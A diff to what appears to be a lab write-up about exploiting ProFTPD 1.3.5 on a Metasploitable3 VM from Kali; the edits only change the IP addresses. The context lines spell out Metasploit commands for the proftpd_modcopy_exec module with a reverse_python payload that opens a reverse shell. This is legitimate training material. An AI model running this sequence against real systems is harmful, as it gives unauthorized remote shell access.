@@ -12,7 +12,7 @@ To get started, we needed the IP address of the Metasploitable3 machine. We ran 
 
 Before trying anything fancy, we made sure the attacker (Kali Linux) could talk to the victim (Metasploitable3). A simple `ping` to the target IP confirmed everything was good — no packet loss.
 
-- **Target IP:** `10.0.2.7`
+- **Target IP:** `192.168.8.160`
 
 ![Ping Test](Screenshots/B-Connect.png)
 
@@ -34,8 +34,8 @@ Turns out, **ProFTPD 1.3.5** was running — a known vulnerable version. Using M
 
 ### Attack Summary
 
-- **Victim IP:** `10.0.2.7`
-- **Attacker IP:** `10.0.2.5`
+- **Victim IP:** `192.168.8.160`
+- **Attacker IP:** `192.168.8.152`
 - **Vulnerable Service:** ProFTPD 1.3.5
 - **Module Used:** `exploit/unix/ftp/proftpd_modcopy_exec`
 - **Payload:** `cmd/unix/reverse_python`
@@ -47,8 +47,8 @@ Turns out, **ProFTPD 1.3.5** was running — a known vulnerable version. Using M
 msfconsole
 search proftpd 1.3.5
 use exploit/unix/ftp/proftpd_modcopy_exec
-set RHOST 10.0.2.7
-set LHOST 10.0.2.5
+set RHOST 192.168.8.160
+set LHOST 192.168.8.152
 show payloads
 set payload cmd/unix/reverse_python
 set SITEPATH /var/www/html
